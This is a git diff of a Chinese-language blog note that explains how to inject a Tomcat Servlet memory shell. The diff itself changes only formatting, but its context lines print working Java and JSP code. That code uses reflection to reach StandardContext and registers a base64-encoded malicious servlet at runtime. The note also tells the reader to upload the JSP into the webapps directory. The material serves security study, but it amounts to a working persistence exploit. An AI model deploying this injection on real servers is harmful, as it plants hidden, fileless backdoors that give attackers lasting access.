@@ -8,6 +8,7 @@ tags:
   - Tomcat
   - Servlet
   - Servlet内存马
+excerpt: 通过模拟 servletContext.addServlet 动态注册 Servlet 内存马的实现过程与示例。
 ---
 
 # 通过模拟 servletContext.addServlet 注册 Servlet 内存马
@@ -117,16 +118,16 @@ DynamicAddServlet
   - `java/com/summer233`
     - [DemoServlet.java](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/src/main/java/com/summer233/DemoServlet.java)
     - [IndexServlet.java](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/src/main/java/com/summer233/IndexServlet.java)
-    - (*)[DynamicUtils.java](https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/Filter/dynamic-filter-demo/src/main/java/com/summer233/DynamicUtils.java)
+    - (\*)[DynamicUtils.java](https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/Filter/dynamic-filter-demo/src/main/java/com/summer233/DynamicUtils.java)
     - [AddTomcatFilter.java](https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/Filter/dynamic-filter-demo/src/main/java/com/summer233/AddTomcatFilter.java)
-    - (*)[AddTomcatServlet.java](https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/Servlet/addServlet/dynamic-add-servlet/src/main/java/com/summer233/AddTomcatServlet.java)
+    - (\*)[AddTomcatServlet.java](https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/Servlet/addServlet/dynamic-add-servlet/src/main/java/com/summer233/AddTomcatServlet.java)
   - `webapp/WEB-INF`
     - [web.xml](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/src/main/webapp/WEB-INF/web.xml)
 - [pom.xml](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/pom.xml)
 
 ---
 
-其中 `AddTomcatServlet.java`  与 `AddTomcatFilter` 大同小异, 这里就不做过多解释了
+其中 `AddTomcatServlet.java` 与 `AddTomcatFilter` 大同小异, 这里就不做过多解释了
 
 ```java
 package com.summer233;
@@ -160,65 +161,65 @@ import static com.summer233.DynamicUtils.BASIC_SEVLET_CLASS_STRING_BASE64;
 @WebServlet(name = "DynamicAddTomcatServlet", urlPatterns = "/dynamicAddServlet")
 public class AddTomcatServlet extends HttpServlet {
 
-	@Override
-	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+ @Override
+ protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
 
-		try {
+  try {
             PrintWriter writer = resp.getWriter();
             writer.println("debug info print test: start to add servlet<br>");
-			String servletName = "summerDynamicAddServletBasic";
+   String servletName = "summerDynamicAddServletBasic";
 
-			// 从 request 中获取 servletContext
-			ServletContext servletContext = req.getServletContext();
+   // 从 request 中获取 servletContext
+   ServletContext servletContext = req.getServletContext();
 
-			// 如果已有此 servletName 的 Servlet，则不再重复添加
-			if (servletContext.getServletRegistration(servletName) == null) {
+   // 如果已有此 servletName 的 Servlet，则不再重复添加
+   if (servletContext.getServletRegistration(servletName) == null) {
 
-				StandardContext o = null;
+    StandardContext o = null;
 
-				// 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
-				while (o == null) {
-					Field f = servletContext.getClass().getDeclaredField("context");
-					f.setAccessible(true);
-					Object object = f.get(servletContext);
+    // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
+    while (o == null) {
+     Field f = servletContext.getClass().getDeclaredField("context");
+     f.setAccessible(true);
+     Object object = f.get(servletContext);
 
-					switch (object) {
-						case ServletContext sc -> servletContext = sc;
-						case StandardContext sc -> o = sc;
-						default -> throw new IllegalStateException("Unexpected value: " + object);
-					}
-				}
+     switch (object) {
+      case ServletContext sc -> servletContext = sc;
+      case StandardContext sc -> o = sc;
+      default -> throw new IllegalStateException("Unexpected value: " + object);
+     }
+    }
 
-				// 创建自定义 Servlet
-				// Class<?> servletClass = DynamicUtils.getClass(SERVLET_CLASS_STRING);
-				Class<?> servletClass = DynamicUtils.getClass(BASIC_SEVLET_CLASS_STRING_BASE64);
-				
+    // 创建自定义 Servlet
+    // Class<?> servletClass = DynamicUtils.getClass(SERVLET_CLASS_STRING);
+    Class<?> servletClass = DynamicUtils.getClass(BASIC_SEVLET_CLASS_STRING_BASE64);
 
-				// 使用 Wrapper 封装 Servlet
-				Wrapper wrapper = o.createWrapper();
-				wrapper.setName(servletName);
-				wrapper.setLoadOnStartup(1);
-				// wrapper.setServlet((Servlet) servletClass.newInstance());
-				// 上述函数似乎 deprecated 了, 使用下面的函数
-				wrapper.setServlet((Servlet) servletClass.getDeclaredConstructor().newInstance());
-				wrapper.setServletClass(servletClass.getName());
 
-				// 向 children 中添加 wrapper
-				o.addChild(wrapper);
+    // 使用 Wrapper 封装 Servlet
+    Wrapper wrapper = o.createWrapper();
+    wrapper.setName(servletName);
+    wrapper.setLoadOnStartup(1);
+    // wrapper.setServlet((Servlet) servletClass.newInstance());
+    // 上述函数似乎 deprecated 了, 使用下面的函数
+    wrapper.setServlet((Servlet) servletClass.getDeclaredConstructor().newInstance());
+    wrapper.setServletClass(servletClass.getName());
 
-				// 添加 servletMappings
-				// o.addServletMapping("/basicServlet", servletName);
-				// 上述函数似乎 deprecated 了, 使用下面的函数
-				o.addServletMappingDecoded("/basicServlet", servletName);
-				writer.println("tomcat servlet added");
+    // 向 children 中添加 wrapper
+    o.addChild(wrapper);
 
-			} else{
-				writer.println("servlet already exists");
-			}
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
-	}
+    // 添加 servletMappings
+    // o.addServletMapping("/basicServlet", servletName);
+    // 上述函数似乎 deprecated 了, 使用下面的函数
+    o.addServletMappingDecoded("/basicServlet", servletName);
+    writer.println("tomcat servlet added");
+
+   } else{
+    writer.println("servlet already exists");
+   }
+  } catch (Exception e) {
+   e.printStackTrace();
+  }
+ }
 }
 ```
 
@@ -226,7 +227,7 @@ public class AddTomcatServlet extends HttpServlet {
 
 ![image-20240929171908431](http://cdn.ayusummer233.top/DailyNotes/202409291719527.png)
 
-访问  `/dynamicAddServlet` 添加 Servlet:
+访问 `/dynamicAddServlet` 添加 Servlet:
 
 ![image-20240929171958291](http://cdn.ayusummer233.top/DailyNotes/202409291719347.png)
 
@@ -338,10 +339,10 @@ yv66vgAAAEEApQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAI
 <%@ page import="javax.servlet.ServletRequest" %>
 <%@ page import="javax.servlet.ServletResponse" %>
 <%@ page import="javax.servlet.ServletException" %>
-<%@ page import="org.apache.catalina.Wrapper" %> 
+<%@ page import="org.apache.catalina.Wrapper" %>
 <%@ page import="java.lang.reflect.Field" %>
 
-<%! 
+<%!
     // 创建恶意Servlet
     Servlet servlet = new Servlet() {
         @Override
@@ -440,7 +441,7 @@ yv66vgAAAEEApQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAI
 ```jsp
 <%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
 <%@ page import="org.apache.catalina.core.StandardContext" %>
-<%@ page import="org.apache.catalina.Wrapper" %> 
+<%@ page import="org.apache.catalina.Wrapper" %>
 <%@ page import="java.lang.reflect.Field" %>
 <%@ page import="java.util.Base64" %>
 <%@ page import="java.lang.reflect.Method" %>
@@ -506,7 +507,7 @@ yv66vgAAAEEApQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAI
 %>
 ```
 
-> 需要注意的是 
+> 需要注意的是
 >
 > - `<%! ...... %>` 声明脚本元素（Declaration）
 >   - 用于声明类成员变量和方法。
@@ -518,9 +519,9 @@ yv66vgAAAEEApQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAI
 >   - 这些代码片段只能在当前的请求处理过程中使用
 >   - 是用于执行 Java 代码的标签，通常用于处理请求和响应。
 >
-> **不要直接在 `<%! ...... %>` 中编写代码片段, 只能在其中声明变量与方法, 否则编译会报错****
+> **不要直接在 `<%! ...... %>` 中编写代码片段, 只能在其中声明变量与方法, 否则编译会报错\*\***
 
-将此 JSP 写入/上传 到 Tomcat  的 webapps 目录下
+将此 JSP 写入/上传 到 Tomcat 的 webapps 目录下
 
 ![image-20240930160249380](http://cdn.ayusummer233.top/DailyNotes/202409301602568.png)
 
@@ -533,4 +534,3 @@ yv66vgAAAEEApQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAI
 ![image-20240930160405672](http://cdn.ayusummer233.top/DailyNotes/202409301604776.png)
 
 ---
-
